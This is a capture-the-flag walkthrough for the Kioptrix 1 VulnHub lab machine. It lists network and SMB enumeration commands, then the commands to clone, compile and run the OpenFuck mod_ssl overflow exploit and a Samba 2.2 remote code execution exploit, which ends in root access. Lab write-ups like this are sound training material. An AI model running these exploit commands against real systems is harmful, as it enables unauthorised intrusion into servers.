#Kioptrix 1 - VulnHub

**netdiscover -i eth0**

![kio1](https://user-images.githubusercontent.com/15195048/95851963-4b32d000-0d53-11eb-801a-7851796a3b23.png)

**IP 192.168.1.10**

**nmap -sC -sV 192.168.1.10**

https://user-images.githubusercontent.com/15195048/95851965-4c63fd00-0d53-11eb-9b2a-855be54df5ba.png

## 1. Exploiting Apache 

OpenSSH 2.9p2 (protocol 1.99)
Http mod_ssl/2.8.4
This module provides SSL v2/v3 and TLS v1 support for the Apache HTTP Server. 
Exploits: Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow 

**searchsploit mod_ssl**

https://user-images.githubusercontent.com/15195048/95851966-4cfc9380-0d53-11eb-911e-2d0536d6b4b3.png
 
## A) ExploitDB 
Link:https://www.exploit-db.com/exploits/764
number of errors
FIX
https://medium.com/@snowshoe/how-to-compile-openfuckv2-c-69e457b4a1d1

## B) GITHUB

Link:https://github.com/exploit-inters/OpenFuck

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
git clone https://github.com/heltonWernik/OpenFuck.git
apt-get install python3.8-venv
apt-get install libssl-dev
gcc -o OpenFuck OpenFuck.c -lcrypto
./OpenFuck
./OpenFuck 0x6a 192.168.80.145 443 -c 40
error
./OpenFuck 0x6b 192.168.80.145 443 -c 40 works
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


https://user-images.githubusercontent.com/15195048/95851969-4cfc9380-0d53-11eb-98d4-8b7642f08530.png

## 2. Samba Exploit

** 1.enum4linux -a 192.168.1.10

2.smbclient 192.168.1.10 or smbclient -N -L \\192.168.1.10\\

3.nmap -p 139 --script=smb-vuln* 192.168.1.10

4.smbmap -P 139 -H 192.168.1.10 **

5.samba_version.py Github
https://github.com/amitn322/smb-version/blob/master/samba_version.py
python smb-version/samba_version.py -s 192.168.1.10

https://user-images.githubusercontent.com/15195048/95851970-4d952a00-0d53-11eb-9d2a-27844dc33287.png

Samba2.2
searchsploit samba 2.2

https://user-images.githubusercontent.com/15195048/95851974-4e2dc080-0d53-11eb-9467-a88125c91e68.png


Samba < 2.2.8 (Linux/BSD) - Remote Code Execution


https://user-images.githubusercontent.com/15195048/95851978-4ec65700-0d53-11eb-8007-ac8f11e13e5f.pnghttps://user-images.githubusercontent.com/15195048/95851983-4ec65700-0d53-11eb-98ea-370a424c4437.png

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
gcc 10.c
./a.out -b -o 192.168.1.10
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

https://user-images.githubusercontent.com/15195048/95851983-4ec65700-0d53-11eb-98ea-370a424c4437.png

Rooted
